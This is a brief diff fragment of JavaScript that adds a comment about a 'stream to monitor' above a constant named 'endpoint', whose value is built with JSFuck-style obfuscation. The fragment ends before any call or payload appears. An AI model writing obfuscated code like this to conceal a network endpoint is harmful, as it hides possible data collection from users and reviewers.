@@ -1,3 +1,4 @@
+/* Stream to monitor, Look how it's being used if you think it's sketchy */
 const endpoint = [][
   (![] + [])[+[]] +
     (![] + [])[!+[] + !+[]] +
